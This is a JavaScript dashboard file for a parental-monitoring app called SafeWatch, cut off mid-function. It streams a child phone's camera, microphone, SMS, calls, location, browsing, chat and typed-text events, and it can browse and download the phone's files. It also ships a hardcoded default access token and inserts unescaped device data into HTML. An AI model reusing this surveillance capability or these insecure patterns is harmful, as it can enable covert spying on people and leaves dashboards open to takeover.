/* ═══════════════════════════════════════════════════════════════════
   SafeWatch Dashboard — app.js v3
   Full handler for all 12 data types + Leaflet map + audio playback
   ═══════════════════════════════════════════════════════════════════ */

(function () {
    'use strict';

    // ─── State ────────────────────────────────────────────────────────
    let ws = null;
    let map = null;
    let mapMarker = null;
    let mapInitialised = false;
    let cameraFrameCount = 0;
    let lastFrameTime = 0;
    let audioContext = null;
    let audioQueue = [];
    let isPlayingAudio = false;
    let touchEventLog = {}; // keyed by device_id
    const MAX_TOUCH_LOG = 500;
    
    let activeDeviceId = "";
    let connectedDevices = new Set();
    let blockedApps = new Set();

    // FPS tracking
    let fpsFrames = 0;
    let fpsStart = Date.now();

    // FIX: Audio scheduling — tracks the time the next chunk should play
    // so chunks play back-to-back instead of all at once (overlapping = noise)
    let nextAudioTime = 0;

    // ─── Toast System ─────────────────────────────────────────────────
    const TOAST_ICONS = {
        success: '✅',
        error:   '❌',
        warning: '⚠️',
        info:    'ℹ️',
    };

    /**
     * Show a sliding toast notification at the bottom of the screen.
     * @param {string} title    - Bold title line
     * @param {string} msg      - Smaller description line (optional)
     * @param {'success'|'error'|'warning'|'info'} type - Visual style
     * @param {number}  duration - Auto-dismiss delay in ms (default 8000)
     */
    function showToast(title, msg = '', type = 'info', duration = 8000) {
        const container = document.getElementById('toast-container');
        if (!container) return;

        const toast = document.createElement('div');
        toast.className = `toast toast-${type}`;
        toast.style.setProperty('--toast-duration', `${duration / 1000}s`);
        toast.innerHTML = `
            <span class="toast-icon">${TOAST_ICONS[type] || 'ℹ️'}</span>
            <div class="toast-body">
                <div class="toast-title">${title}</div>
                ${msg ? `<div class="toast-msg">${msg}</div>` : ''}
            </div>
            <button class="toast-close" aria-label="Dismiss">×</button>
        `;

        const dismiss = () => {
            toast.classList.add('toast-out');
            setTimeout(() => toast.remove(), 320);
        };

        toast.querySelector('.toast-close').addEventListener('click', dismiss);
        container.appendChild(toast);

        // Auto-dismiss
        const timer = setTimeout(dismiss, duration);
        toast.addEventListener('mouseenter', () => clearTimeout(timer));
        toast.addEventListener('mouseleave', () => setTimeout(dismiss, 2000));
    }

    // ─── DOM refs ─────────────────────────────────────────────────────
    const statusDot    = document.getElementById('status-dot');
    const statusText   = document.getElementById('status-text');
    const childDot     = document.getElementById('child-dot');
    const childText    = document.getElementById('child-status-text');
    const activityFeed = document.getElementById('activity-feed');
    const touchFeed    = document.getElementById('touch-feed');
    const pageTitle    = document.getElementById('page-title');
    const lastUpdate   = document.getElementById('last-update');
    const deviceSelect = document.getElementById('device-select');

    // ─── Navigation ───────────────────────────────────────────────────
    const navItems = document.querySelectorAll('.nav-item');
    const views    = document.querySelectorAll('.view');

    const PAGE_TITLES = {
        overview: 'Overview', battery: 'Battery & Device', network: 'Network / IP',
        location: 'Live Location', apps: 'App Control', websites: 'Website History',
        calls: 'Call Logs', sms: 'SMS Logs', storage: 'Storage Manager',
        camera: 'Live Camera', mic: 'Live Microphone', social: 'Social Media Chats'
    };

    navItems.forEach(item => {
        item.addEventListener('click', e => {
            e.preventDefault();
            const target = item.dataset.target;
            navItems.forEach(n => n.classList.remove('active'));
            views.forEach(v => v.classList.remove('active'));
            item.classList.add('active');
            document.getElementById(`view-${target}`)?.classList.add('active');
            pageTitle.textContent = PAGE_TITLES[target] || target;

            // Init map when location tab is first opened
            if (target === 'location' && !mapInitialised) initMap();
        });
    });

    // Summary card clicks → navigate to relevant panel
    document.getElementById('sc-battery')?.addEventListener('click', () => switchTab('battery'));
    document.getElementById('sc-location')?.addEventListener('click', () => switchTab('location'));
    document.getElementById('sc-network')?.addEventListener('click', () => switchTab('network'));
    document.getElementById('sc-storage')?.addEventListener('click', () => switchTab('storage'));
    document.getElementById('sc-calls')?.addEventListener('click', () => switchTab('calls'));
    document.getElementById('sc-active-app')?.addEventListener('click', () => switchTab('apps'));

    function switchTab(target) {
        navItems.forEach(n => n.classList.remove('active'));
        views.forEach(v => v.classList.remove('active'));
        document.getElementById(`nav-${target}`)?.classList.add('active');
        document.getElementById(`view-${target}`)?.classList.add('active');
        pageTitle.textContent = PAGE_TITLES[target] || target;
        if (target === 'location' && !mapInitialised) initMap();
    }

    function sendCommand(payload) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            showToast('Offline', 'Cannot send command while disconnected', 'error');
            return;
        }
        if (!activeDeviceId) {
            showToast('No Device Selected', 'Please select a child device first', 'warning');
            return;
        }
        
        // IMPORTANT: Inject the target device ID so the backend only routes this
        // command to the specific child phone, avoiding multi-device overlap.
        payload.target_device = activeDeviceId;
        ws.send(JSON.stringify(payload));
    }

    // ─── WebSocket ────────────────────────────────────────────────────
    /**
     * Auto-detects the relay server WebSocket URL from the page's own host.
     * When the dashboard is served from Render, window.location.host is the
     * Render URL, so wss://<host>/ws/parent is always correct — no manual input.
     *
     * Token priority: ?token= query param → hardcoded default.
     */
    function buildWsUrl() {
        const isSecure = window.location.protocol === 'https:';
        const wsProto  = isSecure ? 'wss' : 'ws';
        const host     = window.location.host; // e.g. safewatch-abc.onrender.com

        // Allow override via query string for debugging: ?token=mytoken
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token') || 'safewatch2024';

        return `${wsProto}://${host}/ws/parent?token=${token}`;
    }


    let reconnectTimer = null;

    function connect() {
        if (ws) { try { ws.close(); } catch(e) {} ws = null; }
        if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }

        const url = buildWsUrl();
        const hostDisplay = document.getElementById('server-host-display');
        if (hostDisplay) hostDisplay.textContent = window.location.host || 'localhost';

        addActivity('Connecting to relay…', 'system');
        ws = new WebSocket(url);

        ws.onopen = () => {
            setServerStatus(true);
            addActivity('Connected to relay server ✓', 'system');
        };

        ws.onclose = () => {
            setServerStatus(false);
            ws = null;
            addActivity('Disconnected — retrying in 5s…', 'system');
            // Guard: only schedule one reconnect
            if (!reconnectTimer) {
                reconnectTimer = setTimeout(() => { reconnectTimer = null; connect(); }, 5000);
            }
        };

        ws.onerror = () => {
            addActivity('WebSocket error', 'system');
        };

        ws.onmessage = event => {
            if (typeof event.data === 'string') {
                try {
                    handleData(JSON.parse(event.data));
                } catch(e) {
                    addActivity(`Raw: ${event.data.substring(0,80)}`, 'data');
                }
            }
        };
    }

    document.getElementById('btnReconnect').addEventListener('click', () => {
        if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
        connect();
    });

    // ─── Force Refresh ────────────────────────────────────────────────
    // Sends GET_SNAPSHOT command to child — child immediately pushes all data.
    function forceRefresh() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ command: 'GET_SNAPSHOT' }));
            addActivity('📤 Force refresh sent to child device', 'system');
        } else {
            addActivity('⚠️ Not connected — cannot refresh', 'system');
        }
    }
    document.getElementById('btnForceRefresh')?.addEventListener('click', forceRefresh);

    // ─── Auto status poll every 10s ────────────────────────────────────
    // Polls /api/status to detect if the server sees a child connected
    // even when our WebSocket might have had an issue.
    setInterval(async () => {
        try {
            const r = await fetch('/api/status');
            if (!r.ok) return;
            const s = await r.json();
            // If server says child is online but our WS is closed, reconnect
            if (ws === null || ws.readyState === WebSocket.CLOSED) connect();
            
            // Sync device list
            if (s.connectedDevices) {
                s.connectedDevices.forEach(d => addDevice(d));
            }
        } catch(e) {}
    }, 10_000);


    // ─── Data Dispatch ────────────────────────────────────────────────
    function handleData(data) {
        const ts = new Date().toLocaleTimeString();
        lastUpdate.textContent = `Last update: ${ts}`;

        // Add device to the selector if we haven't seen it
        if (data.deviceId) addDevice(data.deviceId);

        // ====================================================================
        // CROSS-DEVICE DATA ISOLATION
        // ====================================================================
        // Only process incoming UI updates if the data is from the active device.
        if (data.deviceId && data.deviceId !== activeDeviceId && activeDeviceId !== "") {
            // Background processing for non-active devices
            if (data.type === 'social_chats') {
                if (!touchEventLog[data.deviceId]) touchEventLog[data.deviceId] = [];
                touchEventLog[data.deviceId].unshift(data);
                if (touchEventLog[data.deviceId].length > MAX_TOUCH_LOG) touchEventLog[data.deviceId].pop();
            }
            if (data.type === 'child_status') {
                // Update the status dot in the UI if it happens to be for the active device
                // wait, if we are here, it's NOT the active device. We just ignore it or track it globally.
            }
            // Stop processing this event so it doesn't pollute the active view
            return; 
        }

        switch (data.type) {
            case 'child_status':    handleChildStatus(data); break;
            case 'file_ready':
                addActivity(`✅ File ready: ${data.filename} (${data.sizeMB ? data.sizeMB + ' MB' : ''})`, 'system');
                showToast('📥 File Ready to Download', `${data.filename}${data.sizeMB ? ' — ' + data.sizeMB + ' MB' : ''}`, 'success', 10000);
                // Add to the downloads list panel (so missed downloads can be re-triggered)
                addFileToDownloadPanel(data);
                // Auto-trigger browser download
                {
                    const a = document.createElement('a');
                    a.href = data.url;
                    a.download = data.filename;
                    a.target = '_blank';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                }
                break;
            case 'file_upload_started':
                // Large file is being uploaded from device to server — show progress notice
                addActivity(`⏳ Uploading ${data.name} (${data.sizeMB} MB) from device... download link will appear when ready.`, 'system');
                showToast('⏳ Uploading Large File', `${data.name} (${data.sizeMB} MB) — download link will appear when ready`, 'info', 10000);
                // Update the waiting download buttons to show "uploading..."
                document.querySelectorAll('.btn-download[disabled]').forEach(b => {
                    b.textContent = '⏳ Uploading...';
                });
                break;
            case 'call_alert':
                alert(`🚨 CALL ALERT 🚨\nNumber: ${data.number}\nState: ${data.state}`);
                addActivity(`🚨 Call Alert: ${data.number} (${data.state})`, 'system');
                break;
            case 'battery':         handleBattery(data); break;
            case 'network':         handleNetwork(data); break;
            case 'location':        handleLocation(data); break;
            case 'calls':           handleCalls(data); break;
            case 'sms':             handleSms(data); break;
            case 'app_usage':       handleAppUsage(data); break;
            case 'installed_apps':  handleInstalledApps(data); break;
            case 'storage':         handleStorage(data); break;
            case 'camera_frame':    handleCameraFrame(data); break;
            case 'audio_chunk':     handleAudioChunk(data); break;
            case 'social_chats':    handleTouchEvent(data); break;
            case 'current_app':     handleCurrentApp(data); break;
            case 'website_visit':   handleWebsiteVisit(data); break;
            case 'file_list':       handleFileList(data); break;
            case 'file_content':    handleFileContent(data); break;
            case 'force_stop_ack':
                showToast(
                    `✅ Force Stop Confirmed`,
                    `Device confirmed: ${data.target} has been stopped`,
                    'success', 7000
                );
                addActivity(`✅ Force stop confirmed: ${data.target}`, 'system');
                break;
            case 'touch_event':     handleTouchEvent(data); break;
            default:
                if (data.type) addActivity(`Unknown type: ${data.type}`, 'data');
        }
    }

    function addDevice(deviceId) {
        if (!deviceId || connectedDevices.has(deviceId)) return;
        connectedDevices.add(deviceId);
        
        const option = document.createElement('option');
        option.value = deviceId;
        option.textContent = `Device: ${deviceId}`;
        
        if (deviceSelect.options[0].value === "") {
            deviceSelect.innerHTML = '';
        }
        deviceSelect.appendChild(option);
        
        if (!activeDeviceId) {
            activeDeviceId = deviceId;
            deviceSelect.value = deviceId;
            // Fetch snapshot for this device
            forceRefresh();
        }
    }

    deviceSelect?.addEventListener('change', (e) => {
        activeDeviceId = e.target.value;
        addActivity(`Switched to device: ${activeDeviceId}`, 'system');
        clearDashboard();
        forceRefresh();
    });
    
    function clearDashboard() {
        ['bat-percent', 'bat-status', 'bat-source', 'bat-health', 'bat-temp', 'bat-voltage', 'ov-battery',
         'net-type', 'net-ssid', 'net-wifi-ip', 'net-carrier', 'net-all-ips', 'ov-network',
         'loc-lat', 'loc-lng', 'loc-accuracy', 'loc-altitude', 'loc-speed', 'loc-provider', 'loc-updated', 'ov-location'
        ].forEach(id => setText(id, '—'));
        
        const fills = document.querySelectorAll('.ring-fill, .storage-bar-fill');
        fills.forEach(f => f.style.width = '0%');
        
        ['calls-tbody', 'sms-tbody', 'websites-tbody'].forEach(id => {
            const el = document.getElementById(id);
            if (el) el.innerHTML = '<tr><td colspan="4" class="empty">Waiting for data...</td></tr>';
        });
        
        renderTouchFeed();
    }

    // ─── Child Status ─────────────────────────────────────────────────
    function handleChildStatus(data) {
        if (data.deviceId) addDevice(data.deviceId);
        
        if (data.deviceId === activeDeviceId || !activeDeviceId) {
            const online = data.online;
            childDot.className = `child-dot ${online ? 'online' : 'offline'}`;
            childText.textContent = online ? 'Child Online' : 'Child Offline';
            addActivity(online ? `📱 Child device connected! (${data.deviceId})` : `📴 Child device disconnected (${data.deviceId})`, 'system');
        }
    }

    // ─── Battery ──────────────────────────────────────────────────────
    function handleBattery(data) {
        const pct = data.percentage;
        setText('bat-percent', pct);
        setText('bat-status', data.status);
        setText('bat-source', data.chargeSource);
        setText('bat-health', data.health);
        setText('bat-temp', `${data.temperatureC}°C`);
        setText('bat-voltage', `${data.voltageV}V`);
        setText('ov-battery', `${pct}% — ${data.status}`);

        // Animate battery ring
        const circumference = 314; // 2π × 50
        const offset = circumference - (pct / 100) * circumference;
        const fill = document.getElementById('battery-ring-fill');
        if (fill) {
            fill.style.strokeDashoffset = offset;
            fill.style.stroke = pct > 50 ? '#10b981' : pct > 20 ? '#f59e0b' : '#ef4444';
        }

        addActivity(`🔋 Battery: ${pct}% (${data.status})`, 'data');
    }

    // ─── Network ──────────────────────────────────────────────────────
    function handleNetwork(data) {
        setText('net-type',    data.networkType);
        setText('net-ssid',    data.ssid);
        setText('net-wifi-ip', data.wifiIp);
        setText('net-carrier', data.carrierName || 'N/A');
        setText('net-all-ips', data.allIps || '—');
        setText('ov-network',  `${data.networkType} — ${data.wifiIp}`);
        addActivity(`📡 Network: ${data.networkType} (${data.wifiIp})`, 'data');
    }

    // ─── Location ─────────────────────────────────────────────────────
    function handleLocation(data) {
        const lat = data.lat.toFixed(6);
        const lng = data.lng.toFixed(6);
        setText('loc-lat',      lat);
        setText('loc-lng',      lng);
        setText('loc-accuracy', `${data.accuracy?.toFixed(1)} m`);
        setText('loc-altitude', `${data.altitude?.toFixed(1)} m`);
        setText('loc-speed',    `${(data.speed * 3.6)?.toFixed(1)} km/h`);
        setText('loc-provider', data.provider);
        setText('loc-updated',  new Date(data.ts).toLocaleTimeString());
        setText('ov-location',  `${lat}, ${lng}`);

        const mapsLink = document.getElementById('loc-maps-link');
        if (mapsLink) mapsLink.href = `https://www.google.com/maps?q=${data.lat},${data.lng}`;

        // Update Leaflet map
        if (mapInitialised && map) {
            if (mapMarker) {
                mapMarker.setLatLng([data.lat, data.lng]);
            } else {
                mapMarker = L.marker([data.lat, data.lng], {
                    icon: L.divIcon({
                        className: '',
                        html: '<div style="width:16px;height:16px;background:#6366f1;border:3px solid white;border-radius:50%;box-shadow:0 0 12px rgba(99,102,241,0.8)"></div>',
                        iconSize: [16, 16],
                        iconAnchor: [8, 8]
                    })
                }).addTo(map)
                  .bindPopup(`<b>Child Location</b><br>Accuracy: ${data.accuracy?.toFixed(0)}m<br>${new Date(data.ts).toLocaleTimeString()}`);
            }
            map.setView([data.lat, data.lng], map.getZoom() < 12 ? 15 : map.getZoom());
        }

        addActivity(`📍 Location updated: ${lat}, ${lng}`, 'data');
    }

    function initMap() {
        if (mapInitialised) return;
        map = L.map('leaflet-map', {
            center: [0, 0],
            zoom: 2,
            zoomControl: true
        });
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap',
            maxZoom: 19
        }).addTo(map);
        mapInitialised = true;
    }

    // ─── Calls ────────────────────────────────────────────────────────
    function handleCalls(data) {
        const tbody = document.getElementById('calls-tbody');
        if (!tbody) return;
        tbody.innerHTML = '';

        if (!data.logs || data.logs.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" class="empty">No call logs received</td></tr>';
            return;
        }

        setText('ov-calls', `${data.logs[0]?.name || data.logs[0]?.number || '—'}`);
        const badgeMap = { Incoming: 'badge-green', Outgoing: 'badge-blue', Missed: 'badge-red', Rejected: 'badge-red', Blocked: 'badge-orange' };

        data.logs.forEach(log => {
            const tr = document.createElement('tr');
            const badge = badgeMap[log.callType] || 'badge-blue';
            tr.innerHTML = `
                <td>${log.name ? log.name + ' (' + log.number + ')' : (log.number || '—')}</td>
                <td><span class="badge ${badge}">${log.callType}</span></td>
                <td>${formatDuration(log.duration)}</td>
                <td>${new Date(log.date).toLocaleString()}</td>
            `;
            tbody.appendChild(tr);
        });
        addActivity(`📞 ${data.count} call logs received`, 'data');
    }

    // ─── SMS ──────────────────────────────────────────────────────────
    function handleSms(data) {
        const tbody = document.getElementById('sms-tbody');
        if (!tbody) return;
        tbody.innerHTML = '';

        if (!data.messages || data.messages.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" class="empty">No SMS messages received</td></tr>';
            return;
        }

        data.messages.forEach(msg => {
            const tr = document.createElement('tr');
            const badge = msg.type === 'Sent' ? 'badge-blue' : 'badge-green';
            tr.innerHTML = `
                <td>${msg.address || '—'}</td>
                <td><span class="badge ${badge}">${msg.type}</span></td>
                <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis">${escapeHtml(msg.body)}</td>
                <td>${new Date(msg.date).toLocaleString()}</td>
            `;
            tbody.appendChild(tr);
        });
        addActivity(`💬 ${data.count} SMS messages received`, 'data');
    }

    // ─── Current App ──────────────────────────────────────────────────
    function handleCurrentApp(data) {
        setText('ov-active-app', data.appName || data.package || '—');
        addActivity(`📱 Active App: ${data.appName || data.package}`, 'data');
    }

    // ─── App Usage ────────────────────────────────────────────────────
    function handleAppUsage(data) {
        const appList = document.getElementById('app-list');
        if (!appList) return;
        appList.innerHTML = '';

        if (!data.apps || data.apps.length === 0) {
            appList.innerHTML = '<div class="empty-state">No app usage data</div>';
            return;
        }

        const maxMinutes = data.apps[0]?.totalMinutes || 1;
        
        // If current_app hasn't fired yet, fallback to the last app detected by UsageStats
        if (data.last_app_name && document.getElementById('ov-active-app').textContent === '—') {
            setText('ov-active-app', data.last_app_name);
        }

        data.apps.forEach(app => {
            const isBlocked = blockedApps.has(app.packageName);
            const div = document.createElement('div');
            div.className = 'app-item';
            div.dataset.pkg = app.packageName;
            div.innerHTML = `
                <div class="app-icon-placeholder">📱</div>
                <div class="app-details">
                    <div class="app-name">${escapeHtml(app.appName)}</div>
                    <div class="app-pkg">${app.packageName}</div>
                </div>
                <div class="app-time">${app.totalMinutes}m</div>
                <label class="toggle-switch" title="${isBlocked ? 'Blocked' : 'Allowed'} — toggle to ${isBlocked ? 'unblock' : 'block'}">
                    <input type="checkbox" class="app-block-toggle" data-pkg="${app.packageName}" ${isBlocked ? '' : 'checked'}>
                    <span class="slider"></span>
                </label>
            `;
            appList.appendChild(div);
        });

        // Attach toggle listeners
        document.querySelectorAll('.app-block-toggle').forEach(toggle => {
            toggle.addEventListener('change', e => {
                const pkg = e.target.dataset.pkg;
                const allowed = e.target.checked;
                if (allowed) {
                    blockedApps.delete(pkg);
                    sendCommand({ command: 'UNBLOCK_APP', package: pkg });
                    addActivity(`✅ Unblocked: ${pkg}`, 'command');
                } else {
                    blockedApps.add(pkg);
                    sendCommand({ command: 'BLOCK_APP', package: pkg });
                    addActivity(`🚫 Blocked: ${pkg}`, 'command');
                }
            });
        });

        addActivity(`📱 ${data.count} apps usage data received`, 'data');
    }

    function handleInstalledApps(data) {
        // Could supplement app list — just log for now
        addActivity(`📋 ${data.count} installed apps reported`, 'data');
    }

    // ─── Storage ──────────────────────────────────────────────────────
    function handleStorage(data) {
        if (data.internal) {
            const int = data.internal;
            const pct = int.usedPercent || 0;
            const fillEl = document.getElementById('storage-bar-int');
            if (fillEl) fillEl.style.width = `${pct}%`;
            setText('storage-int-text', `${int.usedGB} GB used of ${int.totalGB} GB`);
            setText('stor-int-total', `${int.totalGB} GB`);
            setText('stor-int-used',  `${int.usedGB} GB`);
            setText('stor-int-free',  `${int.freeGB} GB`);
            setText('ov-storage', `${int.usedGB} / ${int.totalGB} GB`);
        }

        if (data.breakdown && data.breakdown.length > 0) {
            const bd = document.getElementById('storage-breakdown');
            if (bd) {
                const maxMB = Math.max(...data.breakdown.map(c => c.sizeMB), 1);
                bd.innerHTML = data.breakdown.map(cat => `
                    <div class="category-bar">
                        <span class="category-bar-label">${cat.category}</span>
                        <div class="category-bar-track">
                            <div class="category-bar-fill" style="width:${(cat.sizeMB/maxMB*100).toFixed(0)}%"></div>
                        </div>
                        <span class="category-bar-value">${cat.sizeMB} MB</span>
                    </div>
                `).join('');
            }
        }
        addActivity(`💾 Storage data updated`, 'data');
    }

    // ─── Camera ───────────────────────────────────────────────────────
    function handleCameraFrame(data) {
        const feed = document.getElementById('camera-feed');
        const placeholder = document.getElementById('camera-placeholder');
        if (!feed) return;

        // FIX: Guard against empty or corrupt frame data before setting img.src
        if (!data.data || data.data.length < 100) {
            console.warn('Camera frame too small or empty, skipping');
            return;
        }

        feed.src = `data:image/jpeg;base64,${data.data}`;
        feed.style.display = 'block';
        if (placeholder) placeholder.style.display = 'none';

        cameraFrameCount++;
        document.getElementById('cam-frame-count').textContent = `${cameraFrameCount} frames received`;
        document.getElementById('cam-last-update').textContent = `Last: ${new Date().toLocaleTimeString()}`;

        // FPS calc
        fpsFrames++;
        const now = Date.now();
        if (now - fpsStart >= 2000) {
            const fps = (fpsFrames / ((now - fpsStart) / 1000)).toFixed(1);
            document.getElementById('camera-fps').textContent = `${fps} fps`;
            fpsFrames = 0;
            fpsStart = now;
        }
    }

    // ─── Audio ────────────────────────────────────────────────────────
    function handleAudioChunk(data) {
        const canvas = document.getElementById('audio-canvas');
        const placeholder = document.getElementById('mic-placeholder');
        if (canvas) canvas.style.display = 'block';
        if (placeholder) placeholder.style.display = 'none';

        // Decode base64 → PCM → visualize
        try {
            const raw = atob(data.data);
            const bytes = new Uint8Array(raw.length);
            for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);

            // Interpret as 16-bit PCM
            const pcm = new Int16Array(bytes.buffer);
            drawAudioWave(canvas, pcm);

            // Web Audio playback
            playPcmChunk(pcm, data.sampleRate || 16000);
        } catch(e) {
            console.warn('Audio decode error:', e);
        }
    }

    function drawAudioWave(canvas, pcm) {
        const ctx = canvas.getContext('2d');
        const W = canvas.width;
        const H = canvas.height;

        ctx.fillStyle = 'rgba(0,0,0,0.5)';
        ctx.fillRect(0, 0, W, H);

        ctx.strokeStyle = '#6366f1';
        ctx.lineWidth = 2;
        ctx.shadowBlur = 8;
        ctx.shadowColor = '#6366f1';
        ctx.beginPath();

        const step = Math.max(1, Math.floor(pcm.length / W));
        for (let x = 0; x < W; x++) {
            const idx = x * step;
            const v = pcm[idx] / 32768;
            const y = (v + 1) / 2 * H;
            x === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
        }
        ctx.stroke();
        ctx.shadowBlur = 0;
    }

    function playPcmChunk(pcm, sampleRate) {
        // FIX 1: Create AudioContext once, reuse it — never create one per chunk
        if (!audioContext) {
            audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate });
            nextAudioTime = 0; // reset scheduling clock
        }

        // FIX 2: Browsers auto-suspend AudioContext if not triggered by user gesture.
        // We must call .resume() before every playback attempt.
        const playChunk = () => {
            const buffer = audioContext.createBuffer(1, pcm.length, sampleRate);
            const channelData = buffer.getChannelData(0);
            for (let i = 0; i < pcm.length; i++) {
                channelData[i] = pcm[i] / 32768;
            }
            const source = audioContext.createBufferSource();
            source.buffer = buffer;
            source.connect(audioContext.destination);

            // FIX 3: Schedule chunks sequentially — not all at currentTime (which causes overlap/noise)
            // If we're behind the current time (chunks arrived too slow), catch up immediately
            const now = audioContext.currentTime;
            if (nextAudioTime < now) nextAudioTime = now + 0.05; // small buffer to avoid glitches
            source.start(nextAudioTime);
            nextAudioTime += buffer.duration;
        };

        if (audioContext.state === 'suspended') {
            audioContext.resume().then(playChunk).catch(e => console.warn('AudioContext resume failed:', e));
        } else {
            playChunk();
        }
    }

    // ─── Touch Activity ───────────────────────────────────────────────
    function handleTouchEvent(data) {
        const devId = data.deviceId || activeDeviceId;
        if (!touchEventLog[devId]) touchEventLog[devId] = [];
        
        touchEventLog[devId].unshift(data);
        if (touchEventLog[devId].length > MAX_TOUCH_LOG) touchEventLog[devId].pop();
        
        if (devId === activeDeviceId) {
            renderTouchFeed();
            // Also add to overview feed for important events
            if (['APP_BLOCKED', 'TEXT_INPUT'].includes(data.eventType)) {
                addActivity(`${data.eventType}: ${data.description?.substring(0,60)}`, 'data');
            }
        }
    }

    function renderTouchFeed() {
        const log = touchEventLog[activeDeviceId] || [];
        const filtered = log;

        const touchFeed = document.getElementById('social-feed');
        if (!touchFeed) return;

        const existing = touchFeed.children.length;
        if (existing === 0 || filtered.length !== existing) {
            touchFeed.innerHTML = '';
            if (filtered.length === 0) {
                touchFeed.innerHTML = '<li class="feed-item system">No events.</li>';
                return;
            }
            filtered.slice(0, 200).forEach(event => {
                const li = document.createElement('li');
                li.className = `feed-item system`;
                li.innerHTML = `
                    <span class="event-type" style="background:#3b82f6;color:white;padding:2px 6px;border-radius:4px;font-size:10px">${escapeHtml(event.package.split('.').pop())}</span>
                    <span>${escapeHtml(event.description?.substring(0,250) || '')}</span>
                    <span class="event-time">${new Date(event.ts).toLocaleTimeString()}</span>
                `;
                touchFeed.appendChild(li);
            });
        }
    }

    document.getElementById('btn-clear-social')?.addEventListener('click', () => {
        if (activeDeviceId) {
            touchEventLog[activeDeviceId] = [];
            document.getElementById('social-feed').innerHTML = '<li class="feed-item system">Log cleared.</li>';
        }
    });

    // ─── Website History ──────────────────────────────────────────────
    function handleWebsiteVisit(data) {
        const tbody = document.getElementById('websites-tbody');
        if (!tbody) return;

        if (tbody.children[0]?.classList.contains('empty')) tbody.innerHTML = '';

        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td style="max-width:280px;overflow:hidden;text-overflow:ellipsis">
                <a href="${escapeHtml(data.url)}" target="_blank" style="color:#818cf8">${escapeHtml(data.url)}</a>
            </td>
            <td>${data.browser?.split('.').pop() || '—'}</td>
            <td>${new Date(data.ts).toLocaleTimeString()}</td>
        `;
        tbody.insertBefore(tr, tbody.firstChild);

        // Keep last 200
        while (tbody.children.length > 200) tbody.removeChild(tbody.lastChild);

        addActivity(`🌐 Visited: ${data.url?.substring(0, 60)}`, 'data');
    }

    // ─── File Browser ───────────────────────────────────────────────
    let currentFilePath = '/sdcard';

    function browseDirectory(path) {
        currentFilePath = path;
        sendCommand({ command: 'LIST_FILES', path: path });
        addActivity(`📁 Browsing: ${path}`, 'command');
    }

    function handleFileList(data) {
        const container = document.getElementById('file-browser-content');
        if (!container) return;

        // Update breadcrumb
        const breadcrumb = document.getElementById('file-breadcrumb');
        if (breadcrumb) {
            const parts = data.path.split('/').filter(Boolean);
            let html = '<span class="bc-part" data-path="/sdcard" style="cursor:pointer;color:#818cf8">/sdcard</span>';
            let built = '';
            parts.forEach((p, i) => {
                built += '/' + p;
                const snap = built;
                html += ` / <span class="bc-part" data-path="${escapeHtml(snap)}" style="cursor:pointer;color:#818cf8">${escapeHtml(p)}</span>`;
            });
            breadcrumb.innerHTML = html;
            breadcrumb.querySelectorAll('.bc-part').forEach(el => {
                el.addEventListener('click', () => browseDirectory(el.dataset.path));
            });
        }

        if (data.error) {
            container.innerHTML = `<div class="file-error">⚠️ ${escapeHtml(data.error)}</div>`;
            return;
        }

        let html = '';

        // Back button
        if (data.parent) {
            html += `<div class="file-entry" data-path="${escapeHtml(data.parent)}" data-isdir="true">
                <span class="file-icon">📁</span>
                <span class="file-name">.. (go up)</span>
            </div>`;
        }

        if (!data.files || data.files.length === 0) {
            html += '<div class="file-empty">Empty folder</div>';
        } else {
            data.files.forEach(f => {
                if (f.isDir) {
                    html += `<div class="file-entry dir" data-path="${escapeHtml(f.path)}" data-isdir="true">
                        <span class="file-icon">📂</span>
                        <span class="file-name">${escapeHtml(f.name)}</span>
                        <span class="file-meta">&nbsp;</span>
                    </div>`;
                } else {
                    const readable = f.readable;
                    html += `<div class="file-entry" data-path="${escapeHtml(f.path)}" data-isdir="false">
                        <span class="file-icon">${getFileIcon(f.name)}</span>
                        <span class="file-name">${escapeHtml(f.name)}</span>
                        <span class="file-meta">${formatBytes(f.size)} &bull; ${new Date(f.modified).toLocaleDateString()}</span>
                        ${readable ? `<button class="btn-download" data-path="${escapeHtml(f.path)}">⬇️ Download</button>` : '<span style="color:#f87171">No access</span>'}
                    </div>`;
                }
            });
        }
        container.innerHTML = html;

        // Attach click handlers
        container.querySelectorAll('.file-entry').forEach(el => {
            el.addEventListener('click', (e) => {
                if (e.target.classList.contains('btn-download')) return;  // handled below
                if (el.dataset.isdir === 'true') browseDirectory(el.dataset.path);
            });
        });
        container.querySelectorAll('.btn-download').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.stopPropagation();
                sendCommand({ command: 'DOWNLOAD_FILE', path: btn.dataset.path });
                addActivity(`⬇️ Downloading: ${btn.dataset.path.split('/').pop()}`, 'command');
                btn.textContent = '⏳ Waiting...';
                btn.disabled = true;
            });
        });
    }

    function handleFileContent(data) {
        if (data.error) {
            addActivity(`❌ Download failed: ${data.error}`, 'system');
            // Re-enable download button
            document.querySelectorAll('.btn-download[disabled]').forEach(b => {
                b.textContent = '⬇️ Download'; b.disabled = false;
            });
            return;
        }

        // FIX: Use direct URL if the server already has the file (large file path).
        // Only use atob() in-memory decode for small files (≤10 MB) that came via WebSocket base64.
        if (data.url) {
            // Large file — just open the server URL directly.
            // Browser streams it to disk without loading into JS memory.
            const a = document.createElement('a');
            a.href = data.url;
            a.download = data.name || 'download';
            a.target = '_blank';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            addActivity(`✅ Downloading: ${data.name}`, 'system');
            return;
        }

        // Small file — came as base64 over WebSocket. Decode and trigger browser save.
        try {
            // FIX: Use Blob constructor directly instead of charCodeAt loop for speed
            const byteChars = atob(data.data);
            const byteNums  = new Uint8Array(byteChars.length);
